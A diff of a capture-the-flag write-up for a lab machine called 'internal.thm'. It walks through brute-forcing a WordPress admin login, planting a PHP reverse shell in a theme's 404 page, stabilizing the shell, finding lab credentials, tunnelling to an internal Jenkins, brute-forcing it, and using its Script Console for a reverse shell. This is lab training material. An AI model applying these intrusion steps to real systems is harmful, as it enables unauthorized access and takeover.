@@ -55,35 +55,35 @@ Results:
 /blog/ (dirbuster detected some basic wordpress directories and files which confirms this is wordpress based website)
 ```
 
-While looking at the index page of blog we only see basic page with twentyseventeen theme. 
-Looking at source code we don't see anything crucial, we can see plugins, themes, some uploads but nothing crucial.
-As I checked for robots.txt which returned 404 i remembered i should check for sitemap.xml which can give me informations about users and authors which i can later brute force on login if i don't find any vulnerable theme or plugin.
-But sitemap.xml returned 404 so i ran my tool which enumerates authors and usernames through the archives and posts.
-We got username `admin` which we will note for the case where we don't find any vulnerability.
-For scanning vulnerabilities on wordpress websites we will use `WPscan` which is great enumeration and vulnerability scanning tool.
-Unfortunately we found 39 vulnerabilities which are probably not intentionally left there so we will brute force login with same tool and we can get back to those CVEs later.
-
-Using a `/usr/share/wordlists/rockyou.txt` wordlist we will attack the wp-login.php page which is located in `http://internal.thm/blog/wp-login.php`.
-Bingo! `Valid Combinations Found: Username admin, Password my2boys`
-We will use these given credentials to login on the admin panel
-`admin:my2boys`
+While looking at the index page of blog we only see basic page with twentyseventeen theme. <br>
+Looking at source code we don't see anything crucial, we can see plugins, themes, some uploads but nothing crucial.<br>
+As I checked for robots.txt which returned 404 i remembered i should check for sitemap.xml which can give me informations about users and authors which i can later brute force on login if i don't find any vulnerable theme or plugin.<br>
+But sitemap.xml returned 404 so i ran my tool which enumerates authors and usernames through the archives and posts.<br>
+We got username `admin` which we will note for the case where we don't find any vulnerability.<br>
+For scanning vulnerabilities on wordpress websites we will use `WPscan` which is great enumeration and vulnerability scanning tool.<br>
+Unfortunately we found 39 vulnerabilities which are probably not intentionally left there so we will brute force login with same tool and we can get back to those CVEs later.<br>
+ <br>
+Using a `/usr/share/wordlists/rockyou.txt` wordlist we will attack the wp-login.php page which is located in `http://internal.thm/blog/wp-login.php`.<br>
+Bingo! `Valid Combinations Found: Username admin, Password my2boys`<br>
+We will use these given credentials to login on the admin panel<br>
+`admin:my2boys`<br>
 
 ## Getting access
-After successfully logging in the admin panel, we get prompted with question if we want to update the admin email or leave it as it is.
-We will skip on this one because our goal is getting webshell or reverse shell.
-For this purposes idea is to edit built-in pages with the malicious code which will execute under condition that we visit website.
-
-So twentyseventeen is a theme. Themes got their own custom 404 page that will run when you visit non-existing page. So for a fact we know that we can modify that page which we will do.
-Through the admin panel, we can see the side menu on left side which contains tab themes.
-So the path is `Themes>>Theme editor>>404.php`
-
-`https://github.com/pentestmonkey/php-reverse-shell`is great for these purposes as it can run as logic bomb when visited. You can download it, modify by just adding your ip address and port as following:
+After successfully logging in the admin panel, we get prompted with question if we want to update the admin email or leave it as it is.<br>
+We will skip on this one because our goal is getting webshell or reverse shell.<br>
+For this purposes idea is to edit built-in pages with the malicious code which will execute under condition that we visit website.<br>
+ <br>
+So twentyseventeen is a theme. Themes got their own custom 404 page that will run when you visit non-existing page. So for a fact we know that we can modify that page which we will do.<br>
+Through the admin panel, we can see the side menu on left side which contains tab themes.<br>
+So the path is `Themes>>Theme editor>>404.php`<br>
+ <br>
+`https://github.com/pentestmonkey/php-reverse-shell`is great for these purposes as it can run as logic bomb when visited. You can download it, modify by just adding your ip address and port as following:<br>
 ```
 $ip = '10.8.22.53';  // CHANGE THIS TO YOUR IP
 $port = 1234;       // CHANGE THIS TO WANTED PORT
 ```
-And you can finally start your connection listener on all interfaces by running `nc -lvnp 1234` in your command line.
-After pasting whole reverse shell code in the 404 template you can press `Publish` and visit the page with following url http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php
+And you can finally start your connection listener on all interfaces by running `nc -lvnp 1234` in your command line.<br>
+After pasting whole reverse shell code in the 404 template you can press `Publish` and visit the page with following url http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php <br>
 Bingo! Reverse shell!
 ```
 $ nc -lvnp 1234            
@@ -107,11 +107,11 @@ stty raw -echo; fg
 Press ENTER
 export TERM=xterm
 ```
-This would make it more stable and better looking and even more useful.
-By trying to visit `/home` directory we encounter `aubreanna` to which we do not have access to enter. So privilege escalation takes part here.
-We are unable to run `sudo -l` but remember we are www-data. We can download and run linpeas and polkits and more if we don't find anything significant.
-
-With enumerations script and techniques we did not find anything that would help us escalate privileges beside modern vulnerabilities that would be considered cheating as the machine is not intended to be used that way.
+This would make it more stable and better looking and even more useful.<br>
+By trying to visit `/home` directory we encounter `aubreanna` to which we do not have access to enter. So privilege escalation takes part here.<br>
+We are unable to run `sudo -l` but remember we are www-data. We can download and run linpeas and polkits and more if we don't find anything significant.<br>
+ <br>
+With enumerations script and techniques we did not find anything that would help us escalate privileges beside modern vulnerabilities that would be considered cheating as the machine is not intended to be used that way.<br>
 Linpeas-ng leads us to /opt directory with sensitive file containing credentials called wp-save.txt which content is this:
 ```
 www-data@internal:/opt$ cat wp-save.txt
@@ -119,7 +119,7 @@ Bill,
 Aubreanna needed these credentials for something later.  Let her know you have them and where they are.
 aubreanna:bubb13guM!@#123
 ```
-By running `su aubreanna` we are becoming that user!
+By running `su aubreanna` we are becoming that user!<br>
 Now we will go and examine home directory
 ```
 aubreanna@internal:/opt$ cd ~
@@ -134,21 +134,21 @@ Hmm but what is this `jenkins.txt` let's see.
 aubreanna@internal:~$ cat jenkins.txt
 Internal Jenkins service is running on 172.17.0.2:8080
 ```
-Let's check if it is still running with netstat.
+Let's check if it is still running with netstat.<br>
 `tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN     `
-and yes, it is running.
-
+and yes, it is running.<br>
+ <br>
 We will have to do ssh tunelling so we can access the internal service that can be only visited through localhost.
 We can do that with following command:
 ```
 ssh -L 9090:127.0.0.1:8080 aubreanna@internal.thm
 ```
-This would be able to run jenkins service on our 9090 port which we can access through 127.0.0.1:9090
-As we have access to it, we should try default credentials on the login page.
-[jenkins:jenkins, admin:password and etc] did not work so we will have to move to brute forcing.
-It is known that default username for jenkins is either `jenkins` or `admin` (which we already met in wordpress) so we will try admin one first.
-Using burp suite we will brute force login page and we will use top 10 million passwords wordlist as payload with it.
-
+This would be able to run jenkins service on our 9090 port which we can access through 127.0.0.1:9090 <br>
+As we have access to it, we should try default credentials on the login page.<br>
+[jenkins:jenkins, admin:password and etc] did not work so we will have to move to brute forcing.<br>
+It is known that default username for jenkins is either `jenkins` or `admin` (which we already met in wordpress) so we will try admin one first.<br>
+Using burp suite we will brute force login page and we will use top 10 million passwords wordlist as payload with it.<br>
+ <br>
 After some time, correct password was found and it was `spongebob`
 Now we will log in with following credentials: `admin:spongebob`
 After snooping around and checking function by function I have found the `Script Console` which can run arbitary groovy scripts inside of `Manage Jenkins` tab in side menu on left side. So I was almost sure that root was running jenkins or someone with enough privileges to have root acces so I thought reverse shell would be answer.
